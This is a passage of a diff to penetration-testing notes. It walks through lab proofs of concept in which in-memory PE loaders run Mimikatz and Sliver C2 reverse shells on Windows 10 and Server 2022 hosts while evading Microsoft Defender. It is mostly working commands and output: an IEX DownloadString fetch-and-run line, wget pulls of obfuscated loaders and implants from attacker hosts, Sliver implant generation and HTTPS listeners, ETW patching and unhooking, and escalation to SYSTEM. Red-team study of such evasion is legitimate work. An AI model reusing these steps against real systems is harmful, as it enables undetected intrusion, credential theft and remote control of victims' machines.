    It generates an obfuscated and encrypted PowerShell script that contains the PE file that you want to pack.
@@ -1336,11 +2154,10 @@ Examples of tools
     + stop/exit if the PowerShell script is not run on a domain-joined Windows computer
     + wait for 60 seconds before execution
 
-
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+--------------------------------------------------------------------------------------------------
 Step 1 - Generate a PowerShell script that embeded the hacking tool 'Mimikatz'
          (note: during this step, I disabled temporarily my AV on my attacker Windows laptop)
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+--------------------------------------------------------------------------------------------------
 
 PS C:\Temp > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/
              Invoke-PoSH-PePacker/Invoke-PoSH-PePacker.ps1');
@@ -1379,11 +2196,11 @@ PS C:\Temp> Invoke-PoSH-PePacker -FileUrl http://192.168.1.144:8080/mimikatz.exe
 
 PS C:\Temp>
 
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - 
+--------------------------------------------------------------------------------------------------------------------------
 Step 2 - Download and execute straight into memory the PowerShell script (that embed Mimikatz) on a Windows server 2022 
 	 without being detected nor blocked by the Microsoft Defender Antivirus 
          (AMSI bypass, Reflective PE injection, Disabling PowerShell history logging, ...)
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - 
+--------------------------------------------------------------------------------------------------------------------------
 
 PS C:\Users\Administrator> systeminfo
 
@@ -1451,22 +2268,22 @@ VERBOSE: Done!
 PS C:\Users\Administrator>
 
 
----------------------------------------------------------------------------------------------------------------------------------------------------
+***************************************************************************************************************************************************
 ➤ Test 2 - PoC with the tool 'FilelessPELoader' on a Windows 10 laptop protected by the MS Defender antivirus
-            -> Download & execution in-memory of hacking tools without detection
----------------------------------------------------------------------------------------------------------------------------------------------------
+            -> Download and execute in-memory hacking tools without being detected by AV products
+***************************************************************************************************************************************************
 
 The tool "FilelessPELoader" allows to load and execute directly into memory an encrypted remote Portable Executable (PE).
 => Source: https://github.com/TheD1rkMtr/FilelessPELoader
 
 Notes regarding AV detection
 -----------------------------
-This loader works well however during my tests well-known hacking tools such as "Mimikatz.exe" or meterpreter shells were 
-detected & blocked by Windows Defender.
+This loader works well however during my tests well-known hacking tools such as "Mimikatz.exe" or meterpreter shells were detected & blocked by Windows Defender.
 
 
-Step 1 - Download and compile the tool 'FilelessPELoader'
----------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------
+Step 1 - Download, obfuscate and compile the source code of the tool 'FilelessPELoader'
+--------------------------------------------------------------------------------------------------------------------------
 
 C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main>dir
  Volume in drive C is Windows
@@ -1506,8 +2323,9 @@ C:\Users\jfc\Documents\Tools-Pentest\1-Antivirus-bypass\FilelessPELoader-main\Fi
                3 Dir(s)  248,799,092,736 bytes free
 
 
-Step 2 - Generate a SLIVER https reverse shell and encrypt it with the python script 'aes.py'
----------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------
+Step 2 - Generate a SLIVER C2 https reverse shell and encrypt it with the python script 'aes.py'
+--------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/SLiver-C2$ sudo sliver-server
 [*] Loaded 17 aliases from disk
@@ -1559,9 +2377,9 @@ jeff@kali:~/Documents/Tools/FilelessPELoader-main$ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
 
-
+--------------------------------------------------------------------------------------------------------------------------
 Step 3 - Download & execute (in-memory) the encrypted SLiver C2 implant using the tool 'FilelessPELoader'
----------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------
 
 C:\Temp>powershell
 Windows PowerShell
@@ -1594,9 +2412,9 @@ C:\Temp>.\FilelessPELoader.exe 192.168.1.30 8080 cipher.bin key.bin
 [+] PE Decrypted
 [+] Loading and Running PE
 
-
-Step 4 - Enjoy the SLIVER reverse shell running on the target Windows 10 laptop without being detected by the MS Defender AV
-----------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Enjoy the SLIVER C2 reverse shell running on the target Windows 10 laptop without being detected by the MS Defender AV
+---------------------------------------------------------------------------------------------------------------------------------
 
 [server] sliver > https --lhost 192.168.1.30 --lport 443
 
@@ -1627,5 +2445,514 @@ S-1-5-21-666114207-261065646-224150901-1121
 Logon ID: LAB\jfc
 [*] Current Token ID: LAB\jfc
 [server] sliver (ROUND_CRIMINAL) >  
+
+<SNIP>
+
+
+***************************************************************************************************************************************************
+➤ Test 3 - PoC with the tool 'FilelessRemotePE' on a Windows 2022 server protected by the MS Defender antivirus
+            -> Download and execute in-memory hacking tools without being detected by AV products
+***************************************************************************************************************************************************
+
+> Source: https://github.com/ASkyeye/FilelessRemotePE
+
+The tool "FilelessRemotePE" allows to load directly into memory remote Portable Executable (PE) files with:
+> argument passing
+> ETW patching
+> NTDLL unhooking
+> no new thread technique
+
+Limitation: It runs only c/c++/asm based binaries.
+
+--------------------------------------------------------------------------------------------------------------------------
+Step 1 - Download, obfuscate and compile the source code of the tool 'FilelessRemotePE'
+--------------------------------------------------------------------------------------------------------------------------
+
+> Github - https://github.com/ASkyeye/FilelessRemotePE
+
+I named my obfuscated version of the tool "RemotePe-v0.exe".
+
+
+--------------------------------------------------------------------------------------------------------------------------
+Step 2 - Generate a SLIVER C2 https reverse shell and start a listener
+--------------------------------------------------------------------------------------------------------------------------
+
+┌──(kali㉿kali)-[~]
+└─$ sudo sliver-server
+[sudo] password for kali:
+
+    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
+    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
+    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
+    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
+    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
+    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
+
+All hackers gain jump-start
+[*] Server v1.5.42 - kali
+[*] Welcome to the sliver shell, please type 'help' for options
+
+[*] Check for updates with the 'update' command
+
+
+[server] sliver > generate --arch amd64 -f exe --http 192.168.1.147 --save /home/kali/Documents/Tools/SliverRevShell1.exe --os Windows
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 33s
+[*] Implant saved to /home/kali/Documents/Tools/SliverRevShell1.exe
+
+
+[server] sliver > https --lhost 192.168.1.147 --lport 443
+
+[*] Starting HTTPS :443 listener ...
+[*] Successfully started job #1
+
+---------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download and execute the tool 'FilelessRemotePE' (in this PoC renamed as 'RemotePe-v0.exe') on a target Windows server 2022
+         protected by the MS Defender AV
+---------------------------------------------------------------------------------------------------------------------------------------
+
+Microsoft Windows [Version 10.0.20348.3932]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator> systeminfo
+
+Host Name:                 SERVER-WIN2022
+OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
+OS Version:                10.0.20348 N/A Build 20348
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+<SNIP>
+
+C:\Users\Administrator> powershell -c "Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,
+                                       AntivirusSIgnatureLastUpdated|FL"
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSIgnatureLastUpdated : 8/11/2025 11:53:05 AM
+
+C:\Users\Administrator>cd C:\temp
+
+C:\temp> powershell -c "wget -uri http://192.168.1.144:8080/RemotePe-V0.exe -OutFile C:\temp\RemotePe-v0.exe"
+
+C:\temp> powershell -c "wget -uri http://192.168.1.23:8080/vcruntime140_1.dll -OutFile C:\temp\vcruntime140_1.dll"
+
+C:\temp> powershell -c "wget -uri http://192.168.1.23:8080/msvcp140.dll -OutFile C:\temp\msvcp140.dll"
+
+C:\temp> echo http://192.168.1.23:8080/SliverRevShell1.exe | RemotePe-v0.exe
+
+[+] Unhooking
+
+[+] Patch ETW
+
+[+] Enter the uri :
+
+[+] Loading Remote PE from http://192.168.1.23:8080/SliverRevShell1.exe
+
+[+] Run PE
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Enjoy the SLIVER C2 reverse shell running on the target Windows server 2022 (without being detected by the MS Defender AV)
+------------------------------------------------------------------------------------------------------------------------------------
+
+
+[server] sliver >
+
+[*] Session 4932a377 JUDICIAL_SHEATH - 192.168.1.25:49780 (Server-Win2022) - windows/amd64 - Mon, 11 Aug 2025 20:25:48 EDT
+
+[server] sliver > sessions
+
+ ID         Name              Transport   Remote Address       Hostname         Username                       Operating System   Locale   Last Message                            Health
+========== ================= =========== ==================== ================ ============================== ================== ======== ======================================= =========
+ 4932a377   JUDICIAL_SHEATH   http(s)     192.168.1.25:49780   Server-Win2022   SERVER-WIN2022\Administrator   windows/amd64      en-US    Mon Aug 11 20:26:42 EDT 2025 (0s ago)   [ALIVE]
+
+[server] sliver > sessions -i 4932a377
+
+[*] Active session JUDICIAL_SHEATH (4932a377)
+
+[server] sliver (JUDICIAL_SHEATH) > info
+
+        Session ID: 4932a377-5820-4133-902d-d9d7867405ad
+              Name: JUDICIAL_SHEATH
+          Hostname: Server-Win2022
+              UUID: 7f5cf82a-0437-4773-84b0-599f0a2c0b48
+          Username: SERVER-WIN2022\Administrator
+               UID: S-1-5-21-3336774573-1234467604-3718094125-500
+               GID: S-1-5-21-3336774573-1234467604-3718094125-513
+               PID: 660
+                OS: windows
+           Version: Server 2016 build 20348 x86_64
+            Locale: en-US
+              Arch: amd64
+         Active C2: https://192.168.1.147
+    Remote Address: 192.168.1.25:49780
+         Proxy URL:
+Reconnect Interval: 1m0s
+     First Contact: Mon Aug 11 20:25:48 EDT 2025 (1m43s ago)
+      Last Checkin: Mon Aug 11 20:27:30 EDT 2025 (1s ago)
+
+[server] sliver (JUDICIAL_SHEATH) >
+
+[server] sliver (JUDICIAL_SHEATH) > getuid
+
+S-1-5-21-3336774573-1234467604-3718094125-500
+
+[server] sliver (JUDICIAL_SHEATH) > pwd
+
+[*] C:\temp
+
+[server] sliver (JUDICIAL_SHEATH) > ps
+
+ Pid    Ppid   Owner                          Arch     Executable                    Session
+====== ====== ============================== ======== ============================= =========
+ 0      0                                              [System Process]              -1
+ 4      0                                     x86_64   System                        0
+ 100    4                                     x86_64   Registry                      0
+ 304    4                                     x86_64   smss.exe                      0
+ 404    396                                            csrss.exe                     -1
+ 476    396                                   x86_64   wininit.exe                   0
+ 484    468                                            csrss.exe                     -1
+ 548    468                                   x86_64   winlogon.exe                  1
+ 616    476                                   x86_64   services.exe                  0
+
+? [1/3] Continue? No
+
+⚠️  Security Product(s): Windows Defender, Windows Smart Screen
+
+[server] sliver (JUDICIAL_SHEATH) >
+
+[server] sliver (JUDICIAL_SHEATH) > getsystem
+
+[*] A new SYSTEM session should pop soon...
+
+[*] Session 394487ad JUDICIAL_SHEATH - 192.168.1.25:49966 (Server-Win2022) - windows/amd64 - Mon, 11 Aug 2025 20:35:08 EDT
+
+
+[server] sliver (JUDICIAL_SHEATH) > background
+
+[*] Background ...
+
+
+[server] sliver > sessions -i 394487ad
+
+[*] Active session JUDICIAL_SHEATH (394487ad)
+
+[server] sliver (JUDICIAL_SHEATH) > whoami
+
+Logon ID: NT AUTHORITY\SYSTEM
+[*] Current Token ID: NT AUTHORITY\SYSTEM
+
+<SNIP>
+
+
+***************************************************************************************************************************************************
+➤ Test 4 - PoC with the tool 'DojoLoader' on a Windows 2022 server protected by the MS Defender antivirus
+            -> Download and execute in-memory hacking tools without being detected by AV products
+***************************************************************************************************************************************************
+
+> Source: https://github.com/naksyn/DojoLoader
+
+DojoLoader is a generic PE loader initially created to prototype sleep obfuscation techniques with Cobalt Strike UDRL-less raw Beacon payload,
+in an attempt to reduce debugging time with UDRLs.
+
+DojoLoader borrows MemoryModule implementation of the tool 'DynamicDllLoader' (https://gitlab.com/ORCA000/dynamicdllloader) project by ORCA000 and
+expands on that adding modularity and the following features:
+1. Download and execution of (xored) shellcode from HTTP or from file
+2. Dynamic IAT hooking for Sleep function
+3. Three different Sleep obfuscation techinques implemented in the hook library
+   > 'RW->RX' sleep obfuscation 
+   > 'MemoryBouncing' sleep obfuscation 
+   > 'MemoryHopping' sleep obfuscation  
+
+
+--------------------------------------------------------------------------------------------------------------------------
+Step 1 - Download, obfuscate and compile the source code of the tool 'DojoLoader'
+--------------------------------------------------------------------------------------------------------------------------
+
+> Github - https://github.com/naksyn/DojoLoader
+
+I named my obfuscated version of the tool "Dojo2judo.exe".
+
+--------------------------------------------------------------------------------------------------------------------------
+Step 2 - Generate a SLIVER C2 https reverse shell and start a listener
+--------------------------------------------------------------------------------------------------------------------------
+
+┌──(kali㉿kali)-[~]
+└─$ sudo sliver-server
+[sudo] password for kali:
+
+    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
+    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
+    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
+    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
+    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
+    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
+
+All hackers gain jump-start
+[*] Server v1.5.42 - kali
+[*] Welcome to the sliver shell, please type 'help' for options
+
+[*] Check for updates with the 'update' command
+
+
+[server] sliver > generate --arch amd64 -f exe -l --http 192.168.1.147 --save /home/kali/Documents/Tools/SliverRevShell2.exe --os Windows
+
+[*] Generating new windows/amd64 implant binary
+[!] Symbol obfuscation is disabled
+[*] Build completed in 2s
+[*] Implant saved to /home/kali/Documents/Tools/SliverRevShell2.exe
+
+
+[server] sliver > https --lhost 192.168.1.147 --lport 443
+
+[*] Starting HTTPS :443 listener ...
+[*] Successfully started job #1
+
+---------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Download and execute the tool 'DojoLoader' (in this PoC renamed as 'Dojo2judo.exe') on a target Windows server 2022
+         protected by the MS Defender AV
+---------------------------------------------------------------------------------------------------------------------------------------
+
+Microsoft Windows [Version 10.0.20348.3932]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\temp> powershell -c "Get-ComputerInfo | Select WindowsProductName"
+
+WindowsProductName
+------------------
+Windows Server 2022 Standard Evaluation
+
+
+C:\temp> powershell -c "Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled, AntivirusSIgnatureLastUpdated|FL"
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSIgnatureLastUpdated : 8/12/2025 20:15:45 PM
+
+
+C:\temp> powershell -c "wget -uri http://192.168.1.23:8080/Dojo2judo.exe -OutFile C:\temp\Dojo2judo.exe"
+
+
+=> Run the tool to download and execute the Sliver C2 reverse shell (SliverRevShell2.exe)
+------------------------------------------------------------------------------------------
+
+C:\temp> Dojo2judo.exe -d http://192.168.1.23:8080/SliverRevShell2.exe -s 3
+0: Dojo2judo.exe
+1: -d
+2: http://192.168.1.23:8080/SliverRevShell2.exe
+3: -s
+4: 3
+______      _       _                     _
+|  _  \    (_)     | |                   | |
+| | | |___  _  ___ | |     ___   __ _  __| | ___ _ __
+| | | / _ \| |/ _ \| |    / _ \ / _` |/ _` |/ _ \ '__|
+| |/ / (_) | | (_) | |___| (_) | (_| | (_| |  __/ |
+|___/ \___/| |\___/\_____ \___/ \__,_|\__,_|\___|_|
+          _/ |
+         |__/
+
+Author: @naksyn
+
+URL: http://192.168.1.23:8080/SliverRevShell2.exe
+[+] Buffer allocated at address: 000002136D476070
+[+] Running
+[+] Saved RX memory pointer address: 0x401000 and size 0x4fe200
+[+] no delta detected from address: 0x400000
+[+] Function Name: WriteFile, Address: 00007FFF616A42A0
+[+] Written to IAT at address: 0000000000E17560
+[+] Function Name: WriteConsoleW, Address: 00007FFF616A46C0
+[+] Written to IAT at address: 0000000000E17568
+[+] Function Name: WaitForMultipleObjects, Address: 00007FFF616A3D60
+[+] Written to IAT at address: 0000000000E17570
+[+] Function Name: WaitForSingleObject, Address: 00007FFF616A3D80
+[+] Written to IAT at address: 0000000000E17578
+[+] Function Name: VirtualQuery, Address: 00007FFF6169C040
+[+] Written to IAT at address: 0000000000E17580
+[+] Function Name: VirtualFree, Address: 00007FFF6169BD70
+[+] Written to IAT at address: 0000000000E17588
+[+] Function Name: VirtualAlloc, Address: 00007FFF6169AB20
+[+] Written to IAT at address: 0000000000E17590
+[+] Function Name: TlsAlloc, Address: 00007FFF6169D1D0
+[+] Written to IAT at address: 0000000000E17598
+[+] Function Name: SwitchToThread, Address: 00007FFF6169B1C0
+[+] Written to IAT at address: 0000000000E175A0
+[+] Function Name: SuspendThread, Address: 00007FFF616A0E10
+[+] Written to IAT at address: 0000000000E175A8
+[+] Function Name: SetWaitableTimer, Address: 00007FFF616A3D40
+[+] Written to IAT at address: 0000000000E175B0
+[+] Function Name: SetUnhandledExceptionFilter, Address: 00007FFF6169FA40
+[+] Written to IAT at address: 0000000000E175B8
+[+] Function Name: SetProcessPriorityBoost, Address: 00007FFF616817C0
+[+] Written to IAT at address: 0000000000E175C0
+[+] Function Name: SetEvent, Address: 00007FFF616A3D30
+[+] Written to IAT at address: 0000000000E175C8
+[+] Function Name: SetErrorMode, Address: 00007FFF6169BF50
+[+] Written to IAT at address: 0000000000E175D0
+[+] Function Name: SetConsoleCtrlHandler, Address: 00007FFF616A4690
+[+] Written to IAT at address: 0000000000E175D8
+[+] Function Name: ResumeThread, Address: 00007FFF6169E010
+[+] Written to IAT at address: 0000000000E175E0
+[+] Function Name: PostQueuedCompletionStatus, Address: 00007FFF6169BC40
+[+] Written to IAT at address: 0000000000E175E8
+[+] Function Name: LoadLibraryA, Address: 00007FFF616A0650
+[+] Written to IAT at address: 0000000000E175F0
+[+] Function Name: LoadLibraryW, Address: 00007FFF6169FB30
+[+] Written to IAT at address: 0000000000E175F8
+[+] Function Name: SetThreadContext, Address: 00007FFF616BAD50
+[+] Written to IAT at address: 0000000000E17600
+[+] Function Name: GetThreadContext, Address: 00007FFF616A0D70
+[+] Written to IAT at address: 0000000000E17608
+[+] Function Name: GetSystemInfo, Address: 00007FFF6169D690
+[+] Written to IAT at address: 0000000000E17610
+[+] Function Name: GetSystemDirectoryA, Address: 00007FFF6169DB30
+[+] Written to IAT at address: 0000000000E17618
+[+] Function Name: GetStdHandle, Address: 00007FFF6169D330
+[+] Written to IAT at address: 0000000000E17620
+[+] Function Name: GetQueuedCompletionStatusEx, Address: 00007FFF616A7310
+[+] Written to IAT at address: 0000000000E17628
+[+] Function Name: GetProcessAffinityMask, Address: 00007FFF6169C3B0
+[+] Written to IAT at address: 0000000000E17630
+[+] Function Name: GetProcAddress, Address: 00007FFF6169AA50
+[+] Written to IAT at address: 0000000000E17638
+[+] Function Name: GetEnvironmentStringsW, Address: 00007FFF6169F960
+[+] Written to IAT at address: 0000000000E17640
+[+] Function Name: GetConsoleMode, Address: 00007FFF616A45F0
+[+] Written to IAT at address: 0000000000E17648
+[+] Function Name: FreeEnvironmentStringsW, Address: 00007FFF6169F980
+[+] Written to IAT at address: 0000000000E17650
+[+] Function Name: ExitProcess, Address: 00007FFF6169DCD0
+[+] Written to IAT at address: 0000000000E17658
+[+] Function Name: DuplicateHandle, Address: 00007FFF616A3BA0
+[+] Written to IAT at address: 0000000000E17660
+[+] Function Name: CreateWaitableTimerExW, Address: 00007FFF616A3C80
+[+] Written to IAT at address: 0000000000E17668
+[+] Function Name: CreateThread, Address: 00007FFF6169B270
+[+] Written to IAT at address: 0000000000E17670
+[+] Function Name: CreateIoCompletionPort, Address: 00007FFF616A0120
+[+] Written to IAT at address: 0000000000E17678
+[+] Function Name: CreateFileA, Address: 00007FFF616A3E00
+[+] Written to IAT at address: 0000000000E17680
+[+] Function Name: CreateEventA, Address: 00007FFF616A3BE0
+[+] Written to IAT at address: 0000000000E17688
+[+] Function Name: CloseHandle, Address: 00007FFF616A3B90
+[+] Written to IAT at address: 0000000000E17690
+[+] Function Name: AddVectoredExceptionHandler, Address: 00007FFF635C4F50
+[+] Written to IAT at address: 0000000000E17698
+[+] VirtualProtect succeeded for address: 0000000000401000, size: 5235200 (0x4fe200), permissions: 32
+[+] VirtualProtect succeeded for address: 0000000000900000, size: 5335552 (0x516a00), permissions: 2
+[+] VirtualProtect succeeded for address: 0000000000E17000, size: 310272 (0x4bc00), permissions: 4
+[+] VirtualProtect succeeded for address: 0000000000ECB000, size: 1536 (0x600), permissions: 4
+[+] Calling entry point at address: 0000000000468A00
+[+] freeing original opened/downloaded payload at address 000002136D476070
+
+
+Important notes:
+----------------
+> The loader worked correctly and I got a Sliver C2 reverse shell (example in 'step 4'). 
+> However, while the loader itself was not detected by the MS Defender Antivirus, a copy of the C2 reverse shell was detected because it was 
+  stored in the folder "AppData\Local\Microsoft\Windows\INetCache\IE\" by the tool when downloading it.
+
+	Windows Defender AV - Threat detection: Trojan:Win32/SuspGolang.AG
+	-------------------------------------------------------------------
+	Alert level: Severe
+	Details: This program is dangerous and executes commands from an attacker.
+	Affected Items:
+	file: C:\Users\Administrator\AppData\Local\Microsoft\Windows\INetCache\IE\YGW3S37V\SliverRevShell2.exe
+
+> I had the same results when testing the other sleep obfuscation methods.
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Enjoy the SLIVER C2 reverse shell running on the target Windows server 2022 (without being blocked by the MS Defender AV)
+------------------------------------------------------------------------------------------------------------------------------------
+
+[*] Session 2b18378e COOING_HUNT - 192.168.1.25:65270 (Server-Win2022) - windows/amd64 - Tue, 12 Aug 2025 21:24:34 EDT
+
+[server] sliver > sessions
+
+ ID         Name          Transport   Remote Address       Hostname         Username                       Operating System   Locale   Last Message                              Health
+========== ============= =========== ==================== ================ ============================== ================== ======== ========================================= =========
+ 2b18378e   COOING_HUNT   http(s)     192.168.1.25:65270   Server-Win2022   SERVER-WIN2022\Administrator   windows/amd64      en-US    Tue Aug 12 21:27:56 EDT 2025 (3s ago)     [ALIVE]
+
+
+[server] sliver > sessions -i 2b18378e
+
+[*] Active session COOING_HUNT (2b18378e)
+
+[server] sliver (COOING_HUNT) > pwd
+
+[*] C:\temp
+
+[server] sliver (COOING_HUNT) > getuid
+
+S-1-5-21-3336774573-1234467604-3718094125-500
+
+[server] sliver (COOING_HUNT) > getprivs
+
+Privilege Information for Dojo2judo.exe (PID: 2864)
+---------------------------------------------------
+
+Process Integrity Level: High
+
+Name                                            Description                                                            Attributes
+====                                            ===========                                                            ==========
+SeIncreaseQuotaPrivilege                        Adjust memory quotas for a process                                     Disabled
+SeSecurityPrivilege                             Manage auditing and security log                                       Disabled
+SeTakeOwnershipPrivilege                        Take ownership of files or other objects                               Disabled
+SeLoadDriverPrivilege                           Load and unload device drivers                                         Disabled
+SeSystemProfilePrivilege                        Profile system performance                                             Disabled
+SeSystemtimePrivilege                           Change the system time                                                 Disabled
+SeProfileSingleProcessPrivilege                 Profile single process                                                 Disabled
+SeIncreaseBasePriorityPrivilege                 Increase scheduling priority                                           Disabled
+SeCreatePagefilePrivilege                       Create a pagefile                                                      Disabled
+SeBackupPrivilege                               Back up files and directories                                          Disabled
+SeRestorePrivilege                              Restore files and directories                                          Disabled
+SeShutdownPrivilege                             Shut down the system                                                   Disabled
+SeDebugPrivilege                                Debug programs                                                         Disabled
+SeSystemEnvironmentPrivilege                    Modify firmware environment values                                     Disabled
+SeChangeNotifyPrivilege                         Bypass traverse checking                                               Enabled, Enabled by Default
+SeRemoteShutdownPrivilege                       Force shutdown from a remote system                                    Disabled
+SeUndockPrivilege                               Remove computer from docking station                                   Disabled
+SeManageVolumePrivilege                         Perform volume maintenance tasks                                       Disabled
+SeImpersonatePrivilege                          Impersonate a client after authentication                              Enabled, Enabled by Default
+SeCreateGlobalPrivilege                         Create global objects                                                  Enabled, Enabled by Default
+SeIncreaseWorkingSetPrivilege                   Increase a process working set                                         Disabled
+SeTimeZonePrivilege                             Change the time zone                                                   Disabled
+SeCreateSymbolicLinkPrivilege                   Create symbolic links                                                  Disabled
+SeDelegateSessionUserImpersonatePrivilege       Obtain an impersonation token for another user in the same session     Disabled
+
+
+[server] sliver (COOING_HUNT) > ps
+
+ Pid    Ppid   Owner                          Arch     Executable                    Session
+====== ====== ============================== ======== ============================= =========
+ 0      0                                              [System Process]              -1
+ 4      0                                     x86_64   System                        0
+ 100    4                                     x86_64   Registry                      0
+ 308    4                                     x86_64   smss.exe                      0
+ 408    400                                            csrss.exe                     -1
+ 496    400                                   x86_64   wininit.exe                   0
+ 516    488                                            csrss.exe                     -1
+ 596    488                                   x86_64   winlogon.exe                  1
+ 636    496                                   x86_64   services.exe                  0
+ 644    496                                   x86_64   lsass.exe                     0
+ 752    636                                   x86_64   svchost.exe                   0
+ 780    496                                            fontdrvhost.exe               -1
+ 788    596                                            fontdrvhost.exe               -1
+ 872    636                                   x86_64   svchost.exe                   0
+ 920    636                                   x86_64   svchost.exe                   0
+<SNIP>
+
+? [1/3] Continue? No
+
+⚠️  Security Product(s): Windows Defender, Windows Defender, Windows Smart Screen
 
 <SNIP>
